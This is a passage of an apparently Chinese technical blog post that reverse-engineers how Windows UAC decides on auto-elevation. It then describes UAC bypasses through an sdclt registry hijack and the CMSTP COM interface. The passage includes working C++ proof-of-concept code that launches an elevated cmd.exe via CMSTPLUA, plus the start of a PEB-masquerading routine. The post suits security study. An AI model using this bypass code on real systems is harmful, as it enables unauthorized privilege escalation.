<span class="number">0</span> &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(v8[<span class="number">0</span>] - <span class="number">5</span>) &lt;= <span class="number">1</span> &amp;&amp; v8[<span class="number">20</span>] ) &#123; <span class="comment">//验证子进程数位签名是否有效 wintrust.dll</span></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;DestinationString, a2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">AipMatchesOriginalFileName</span>(&amp;DestinationString); <span class="comment">//验证当前子程序档案名与编译阶段相同 未被修改</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="UAC介面程式-ConsentUI"><a href="#UAC介面程式-ConsentUI" class="headerlink" title="UAC介面程式 ConsentUI"></a>UAC介面程式 ConsentUI</h3><p>通过认证后用<code>AiLaunchConsentUI</code>唤起consent.exe，并将trustedFlag传给后者。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v29 = <span class="built_in">AiLaunchConsentUI</span>((__int64)v22, v51, a6, v50, v37, v28, v39, a8, &amp;ExistingTokenHandle);</span><br><span class="line">v30 = ExistingTokenHandle;</span><br><span class="line">v17 = v29;</span><br><span class="line"><span class="keyword">if</span> ( !v29 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !ExistingTokenHandle )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (v28 &amp; <span class="number">0x10</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = <span class="number">1223</span>;</span><br></pre></td></tr></table></figure>

<p>在<code>AiLaunchConsentUI</code>中有：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">  ExitCode = SessionLock;</span><br><span class="line">  <span class="keyword">if</span> ( !SessionLock ) &#123;</span><br><span class="line">    ExitCode = <span class="built_in">AiLaunchProcess</span>(<span class="number">0LL</span>,v11,<span class="number">0LL</span>,<span class="number">0x1000080</span>u,<span class="number">0LL</span>,Buffer,<span class="number">0x400</span>u,<span class="number">0LL</span>,v52,<span class="number">0LL</span>,a5,<span class="number">0LL</span>,<span class="number">0</span>,<span class="number">0LL</span>,<span class="number">0LL</span>,<span class="number">0LL</span>,&amp;hObject); <span class="comment">//暂停状态</span></span><br><span class="line">    SessionLock = ExitCode;</span><br><span class="line">    <span class="keyword">if</span> ( !ExitCode ) &#123;</span><br><span class="line">      ExitCode = <span class="built_in">AipVerifyConsent</span>(hObject.hProcess); <span class="comment">//确认consent.exe未被劫持</span></span><br><span class="line">      SessionLock = ExitCode;</span><br><span class="line">      <span class="keyword">if</span> ( !ExitCode ) &#123;</span><br><span class="line">        <span class="built_in">ResumeThread</span>(hObject.hThread); <span class="comment">//唤醒UAC介面程式 接下来等待进程执行结束</span></span><br><span class="line">        ExitCode = <span class="built_in">WaitForSingleObject</span>(hObject.hProcess, dwMilliseconds); <span class="comment">//退出原因 0为确认 0x4C7为否决</span></span><br><span class="line">        SessionLock = ExitCode;</span><br><span class="line">        <span class="keyword">if</span> ( !ExitCode ) &#123;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">GetExitCodeProcess</span>(hObject.hProcess, &amp;ExitCode) ) &#123;</span><br><span class="line">            SessionLock = ExitCode;</span><br><span class="line">            <span class="keyword">if</span> ( ExitCode ) &#123;</span><br><span class="line">              v36 = Handle;</span><br><span class="line">              <span class="keyword">if</span> ( !Handle )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_64;</span><br><span class="line">            &#125;</span><br><span class="line">            v38 = Handle;</span><br><span class="line">            <span class="keyword">if</span> ( pcbData &amp;&amp; Handle ) &#123;</span><br><span class="line">              v39 = <span class="built_in">AipMarkAutoApprovedToken</span>(Handle);</span><br><span class="line">              <span class="keyword">if</span> ( v39 &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">                v40 = <span class="built_in">RtlNtStatusToDosErrorNoTeb</span>(v39);</span><br><span class="line">                v36 = Handle;</span><br><span class="line">                ExitCode = v40;</span><br><span class="line">LABEL_64:</span><br><span class="line">                <span class="built_in">NtClose</span>(v36);</span><br><span class="line">                SessionLock = ExitCode;</span><br><span class="line">                Handle = <span class="number">0LL</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">              &#125;</span><br><span class="line">              SessionLock = ExitCode;</span><br><span class="line">              v38 = Handle;</span><br><span class="line">            &#125;</span><br><span class="line">            *v9 = v38;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            SessionLock = <span class="built_in">GetLastError</span>();</span><br><span class="line">            ExitCode = SessionLock;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>AipVerifyConsent</code>中，有：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">    InformationProcess = <span class="built_in">NtReadVirtualMemory</span>(hProcess, BaseAddress, Buffer, <span class="number">0x7D0</span>uLL, (PSIZE_T)ReturnLength); <span class="comment">//将当前暂停的consent.exe程式内容取出</span></span><br><span class="line">    <span class="keyword">if</span> ( InformationProcess &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    v3 = <span class="built_in">LocalAlloc</span>(<span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !v3 ) &#123;</span><br><span class="line">      LastError = <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">    InformationProcess = <span class="built_in">NtReadVirtualMemory</span>(hProcess, v15, v3, <span class="number">0x1000</span>uLL, (PSIZE_T)ReturnLength);</span><br><span class="line">    <span class="keyword">if</span> ( InformationProcess &lt; <span class="number">0</span> || (InformationProcess = <span class="built_in">RtlImageNtHeaderEx</span>(<span class="number">0</span>, v3, *(ULONGLONG *)ReturnLength, &amp;NtHeader), InformationProcess &lt; <span class="number">0</span>) )</span><br><span class="line">LABEL_22:</span><br><span class="line">      LastError = <span class="built_in">RtlNtStatusToDosErrorNoTeb</span>(InformationProcess);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> ( NtHeader-&gt;OptionalHeader.Magic != <span class="number">523</span> <span class="comment">/*是否为x64进程*/</span>|| (<span class="type">unsigned</span> __int64)NtHeader-&gt;OptionalHeader.SizeOfHeaders &gt; *(_QWORD *)ReturnLength || <span class="built_in">SLOBYTE</span>(NtHeader-&gt;OptionalHeader.DllCharacteristics) &gt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      v5 = (<span class="type">char</span> *)&amp;NtHeader-&gt;OptionalHeader + NtHeader-&gt;FileHeader.SizeOfOptionalHeader;</span><br><span class="line">      v6 = v5 - (_BYTE *)v3;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; NtHeader-&gt;FileHeader.NumberOfSections; ++i ) &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; *(_QWORD *)ReturnLength - <span class="number">40LL</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">        <span class="keyword">if</span> ( *(_QWORD *)v5 == <span class="string">&#x27;tnesnoc&#x27;</span> ) <span class="comment">//找consent段</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v5 += <span class="number">40</span>;</span><br><span class="line">        v6 += <span class="number">40LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( i == NtHeader-&gt;FileHeader.NumberOfSections || *((_DWORD *)v5 + <span class="number">2</span>) != <span class="number">98</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      <span class="built_in">memset_0</span>(Buf1, <span class="number">0</span>, <span class="number">0x62</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">ReadProcessMemory</span>(hProcess, (<span class="type">char</span> *)v15 + *((<span class="type">unsigned</span> <span class="type">int</span> *)v5 + <span class="number">3</span>), Buf1, <span class="number">0x62</span>uLL, <span class="number">0LL</span>) ) &#123;</span><br><span class="line">        LastError = <span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">memcmp_0</span>(Buf1, <span class="string">L&quot;Microsoft Windows (c) 2009 Microsoft Corporation&quot;</span>, <span class="number">0x62</span>uLL) ) <span class="comment">//consent区段是否为该局微软文字标记</span></span><br><span class="line">LABEL_15:</span><br><span class="line">        LastError = <span class="number">577</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_16:</span><br><span class="line">  <span class="built_in">LocalFree</span>(v3);</span><br><span class="line">  <span class="keyword">return</span> LastError;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再回到<code>AiLaunchConsentUI</code>的尾部，有：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">LABEL_3:</span><br><span class="line">  <span class="keyword">if</span> ( hObject.hThread ) &#123;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hObject.hThread);</span><br><span class="line">    SessionLock = ExitCode;</span><br><span class="line">  &#125;</span><br><span class="line">  hProcess = hObject.hProcess;</span><br><span class="line">  <span class="keyword">if</span> ( hObject.hProcess ) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( SessionLock &amp;&amp; SessionLock != <span class="number">1067</span> ) &#123;</span><br><span class="line">      <span class="built_in">TerminateProcess</span>(hObject.hProcess, SessionLock);</span><br><span class="line">      hProcess = hObject.hProcess;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    SessionLock = ExitCode;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v11 ) &#123;</span><br><span class="line">    <span class="built_in">NtClose</span>(v11);</span><br><span class="line">    SessionLock = ExitCode;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( SessionLock == <span class="number">0x102</span> || SessionLock == <span class="number">0x42B</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x4C7</span>LL; <span class="comment">//被拒绝</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> SessionLock; <span class="comment">//同意授权 为0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在<code>AiLaunchProcess</code>内部用<code>CreateProcessAsUserW</code>将子进程路径以高权服务身份创建：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lpCurrentDirectory = v34;</span><br><span class="line">v58 = lpApplicationName;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">CreateProcessAsUserW</span>(hToken,lpApplicationName,lpCommandLine,<span class="number">0LL</span>,<span class="number">0LL</span>,<span class="number">0</span>,a7 | <span class="number">0x80004</span>,Environment,lpCurrentDirectory,&amp;StartupInfo,&amp;hObject) )</span><br><span class="line">  ShouldElevateUIAApplication = <span class="built_in">GetLastError</span>();</span><br><span class="line"><span class="built_in">RevertToSelf</span>();</span><br><span class="line"><span class="keyword">if</span> ( !ShouldElevateUIAApplication ) &#123;</span><br><span class="line">  si128 = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;_xmm_ffffffffffffffffffffffffffffffff);</span><br></pre></td></tr></table></figure>

<p>综上所述，UAC设计的自动特权提升条件有：执行程式自身配置为Auto Elevation、程式档案具有有效数位签名、从可信任的系统目录被执行起来。</p>
<h3 id="不当注册表配置引发的特权劫持提权"><a href="#不当注册表配置引发的特权劫持提权" class="headerlink" title="不当注册表配置引发的特权劫持提权"></a>不当注册表配置引发的特权劫持提权</h3><p>系统还原工具sdclt.exe启动时尝试盲搜注册表，最终读取低权注册键值HKCU\Software\Microsoft\WIndows\CurrentVersion\App Paths\control.exe上储存的文字形式命令字符串：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;C:\Windows\System32\control.exe&quot;</span> /name Microsoft.BackupAndRestoreCenter</span><br></pre></td></tr></table></figure>

<p>接着以特权提升方式唤醒高权的系统控制面板并切换至系统还原配置画面给使用者观看。</p>
<p>其中HKEY_CURRENT_USER注册键值为任何不具特权提升的低权程式皆可写入的注册项目，修改注册表值后可获得特权提升的其他进程。</p>
<h3 id="Elevated-COM-Object-UAC-Bypass"><a href="#Elevated-COM-Object-UAC-Bypass" class="headerlink" title="Elevated COM Object UAC Bypass"></a>Elevated COM Object UAC Bypass</h3><p>Windows 10上无法稳定利用，略。</p>
<h3 id="CMSTP任意特权提升执行"><a href="#CMSTP任意特权提升执行" class="headerlink" title="CMSTP任意特权提升执行"></a>CMSTP任意特权提升执行</h3><p>网路装置连线配置工具cmstp.exe在安装连线配置档案过程中呼叫COM Interface执行文字形式命令字串，只要呼叫此接口便得以特权提升状态执行ShellExecute函数。这节为x86工程。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $g++ masqueradePEB.cpp -lole32 -loleaut32 &amp;&amp; a</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Shobjidl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> interface ICMLuaUtil ICMLuaUtil;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ICMLuaUtilVtbl</span> &#123;</span><br><span class="line">    <span class="function">BEGIN_INTERFACE</span></span><br><span class="line"><span class="function">    <span class="title">HRESULT</span><span class="params">(STDMETHODCALLTYPE *QueryInterface)</span><span class="params">(__RPC__in ICMLuaUtil *This,__RPC__in REFIID riid,_COM_Outptr_ <span class="type">void</span> **ppvObject)</span></span>;</span><br><span class="line">    <span class="built_in">ULONG</span>(STDMETHODCALLTYPE *AddRef)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">ULONG</span>(STDMETHODCALLTYPE *Release)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method1)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method2)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method3)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method4)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method5)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method6)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *ShellExec)(__RPC__in ICMLuaUtil *This,_In_ <span class="type">const</span> <span class="type">wchar_t</span> *lpFile,_In_opt_ <span class="type">const</span> <span class="type">wchar_t</span> *lpParameters,_In_opt_ <span class="type">const</span> <span class="type">wchar_t</span> *lpDirectory,_In_ ULONG fMask,_In_ ULONG nShow);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *SetRegistryStringValue)(__RPC__in ICMLuaUtil *This,_In_ HKEY hKey,_In_opt_ LPCTSTR lpSubKey,_In_opt_ LPCTSTR lpValueName,_In_ LPCTSTR lpValueString);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method9)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method10)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method11)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method12)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method13)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method14)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method15)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method16)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method17)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method18)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method19)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE *Method20)(__RPC__in ICMLuaUtil *This);</span><br><span class="line">    END_INTERFACE</span><br><span class="line">&#125; * PICMLuaUtilVtbl;</span><br><span class="line">interface ICMLuaUtil &#123; CONST_VTBL <span class="keyword">struct</span> <span class="title class_">ICMLuaUtilVtbl</span> *lpVtbl; &#125;;</span><br><span class="line"><span class="function">HRESULT <span class="title">fn_call_CMSTPLUA_shellexecute</span><span class="params">()</span></span>&#123;</span><br><span class="line">    HRESULT hr = <span class="built_in">CoInitializeEx</span>(<span class="literal">NULL</span>, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);</span><br><span class="line">    ICMLuaUtil *CMLuaUtil = <span class="literal">NULL</span>;</span><br><span class="line">    IID xIID_ICMLuaUtil;</span><br><span class="line">    LPCWSTR lpIID = <span class="string">L&quot;&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;&quot;</span>;</span><br><span class="line">    <span class="built_in">IIDFromString</span>(lpIID, &amp;xIID_ICMLuaUtil);</span><br><span class="line">    BIND_OPTS3 bop;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;bop, <span class="built_in">sizeof</span>(bop));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">SUCCEEDED</span>(hr))</span><br><span class="line">        <span class="keyword">return</span> hr;</span><br><span class="line">    bop.cbStruct = <span class="built_in">sizeof</span>(bop);</span><br><span class="line">    bop.dwClassContext = CLSCTX_LOCAL_SERVER;</span><br><span class="line">    hr = <span class="built_in">CoGetObject</span>(<span class="string">L&quot;Elevation:Administrator!new:&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&quot;</span>, (BIND_OPTS *)&amp;bop, xIID_ICMLuaUtil, (VOID **)&amp;CMLuaUtil);</span><br><span class="line">    <span class="keyword">if</span> (hr != S_OK)</span><br><span class="line">        <span class="keyword">return</span> hr;</span><br><span class="line">    hr = CMLuaUtil-&gt;lpVtbl-&gt;<span class="built_in">ShellExec</span>(CMLuaUtil, <span class="string">L&quot;cmd.exe&quot;</span>, <span class="string">L&quot;/k \&quot;echo exploit done.&quot;</span>, <span class="literal">NULL</span>, SEE_MASK_DEFAULT, SW_SHOW); <span class="comment">//要执行的命令</span></span><br><span class="line">    <span class="keyword">if</span> (CMLuaUtil != <span class="literal">NULL</span>)</span><br><span class="line">        CMLuaUtil-&gt;lpVtbl-&gt;<span class="built_in">Release</span>(CMLuaUtil);</span><br><span class="line">    <span class="keyword">return</span> hr;</span><br><span class="line">&#125;；</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING32</span>&#123;</span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING32, *PUNICODE_STRING32;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">mPEB32</span>&#123;</span><br><span class="line">    UCHAR InheritedAddressSpace;</span><br><span class="line">    UCHAR ReadImageFileExecOptions;</span><br><span class="line">    UCHAR BeingDebugged;</span><br><span class="line">    UCHAR BitField;</span><br><span class="line">    ULONG Mutant;</span><br><span class="line">    ULONG ImageBaseAddress;</span><br><span class="line">    PEB_LDR_DATA *Ldr;</span><br><span class="line">    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;</span><br><span class="line">    ULONG SubSystemData;</span><br><span class="line">    ULONG ProcessHeap;</span><br><span class="line">    ULONG FastPebLock;</span><br><span class="line">    ULONG AtlThunkSListPtr;</span><br><span class="line">    ULONG IFEOKey;</span><br><span class="line">    ULONG CrossProcessFlags;</span><br><span class="line">    ULONG UserSharedInfoPtr;</span><br><span class="line">    ULONG SystemReserved;</span><br><span class="line">    ULONG AtlThunkSListPtr32;</span><br><span class="line">    ULONG ApiSetMap;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY32</span>&#123;</span><br><span class="line">    LIST_ENTRY32 InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY32 InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY32 InInitializationOrderModuleList;</span><br><span class="line">    ULONG DllBase;</span><br><span class="line">    ULONG EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING32 FullDllName;</span><br><span class="line">    UNICODE_STRING32 BaseDllName;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="keyword">union</span>&#123;</span><br><span class="line">        LIST_ENTRY32 HashLinks;</span><br><span class="line">        ULONG SectionPointer;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG CheckSum;</span><br><span class="line">    <span class="keyword">union</span>&#123;</span><br><span class="line">        ULONG TimeDateStamp;</span><br><span class="line">        ULONG LoadedImports;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG EntryPointActivationContext;</span><br><span class="line">    ULONG PatchInformation;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY32, *PLDR_DATA_TABLE_ENTRY32;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">void</span>(WINAPI * pfnRtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString) = (<span class="built_in">void</span>(WINAPI *)(PUNICODE_STRING, PCWSTR))<span class="built_in">GetProcAddress</span>(<span class="built_in">LoadLibrary</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;RtlInitUnicodeString&quot;</span>);</span><br><span class="line">    WCHAR lpExplorePath[MAX_PATH];</span><br><span class="line">    <span class="built_in">ExpandEnvironmentStringsW</span>(<span class="string">L&quot;%SYSTEMROOT%\\explorer.exe&quot;</span>, lpExplorePath, <span class="built_in">sizeof</span>(lpExplorePath));</span><br><span class="line">    mPEB32 *pPEB = (mPEB32 *)__readfsdword(<span class="number">0x30</span>); <span class="comment">//x64下改为__readgsdword(0x60)</span></span><br><span class="line">    PLIST_ENTRY header = &amp;(pPEB-&gt;Ldr-&gt;InMemoryOrderModuleList);</span><br><span class="line">    LDR_DATA_TABLE_ENTRY32 *data = <span class="built_in">CONTAINING_RECORD</span>(header-&gt;Flink, 